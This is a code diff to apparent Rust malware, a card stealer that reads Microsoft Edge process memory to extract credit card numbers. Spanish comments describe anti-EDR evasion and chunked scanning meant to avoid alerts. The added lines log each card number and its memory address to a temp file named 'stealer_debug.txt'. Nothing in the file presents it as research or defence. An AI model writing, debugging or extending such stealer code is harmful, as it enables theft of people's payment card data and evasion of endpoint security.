@@ -83,13 +83,36 @@ pub fn find_edge_process() -> Option<EdgeProcess> {
 /// Escanea memoria del proceso Edge buscando patrones de tarjetas
 /// Usa técnicas anti-EDR para no ser detectado
 pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
+    use std::io::Write;
+    
+    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
+    let mut debug_file = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_path)
+        .ok();
+    
+    let mut log = |msg: &str| {
+        if let Some(ref mut file) = debug_file {
+            let _ = writeln!(file, "{}", msg);
+        }
+    };
+    
     let mut cards = Vec::new();
+    
+    log("  🔍 [MEMORY SCAN] Iniciando escaneo...");
+    log(&format!("    PID: {}", edge.pid));
+    log(&format!("    Handle: {:?}", edge.handle));
     
     unsafe {
         // Escanear memoria en chunks pequeños para no levantar alertas
         const CHUNK_SIZE: usize = 4096; // 4KB pages
         let mut address: usize = 0;
         let mut buffer = vec![0u8; CHUNK_SIZE];
+        let mut pages_scanned = 0;
+        let mut pages_readable = 0;
+        
+        log("    Escaneando rango 0x00000000 - 0x7FFF0000 (2GB)...");
         
         // Escanear hasta 2GB (rango típico de user-mode)
         while address < 0x7FFF_0000 {
@@ -104,9 +127,14 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                 &mut bytes_read as *mut usize
             );
             
+            pages_scanned += 1;
+            
             if result != 0 && bytes_read > 0 {
+                pages_readable += 1;
+                
                 // Buscar patrones de números de tarjeta en memoria
                 if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
+                    log(&format!("    ✅ Card found at address 0x{:08X}: {}", address, card.card_number));
                     cards.push(card);
                 }
             }
@@ -115,10 +143,21 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
             address += CHUNK_SIZE;
             
             // Límite de seguridad: no escanear más de 1000 páginas
+            if pages_scanned > 1000 {
+                log(&format!("    ⚠️ Límite alcanzado: {} páginas escaneadas", pages_scanned));
+                break;
+            }
+            
             if cards.len() > 100 {
+                log(&format!("    ⚠️ Límite de tarjetas alcanzado: {}", cards.len()));
                 break;
             }
         }
+        
+        log(&format!("  📊 [MEMORY SCAN] Estadísticas:"));
+        log(&format!("    Páginas escaneadas: {}", pages_scanned));
+        log(&format!("    Páginas legibles: {}", pages_readable));
+        log(&format!("    Tarjetas encontradas: {}", cards.len()));
     }
     
     cards
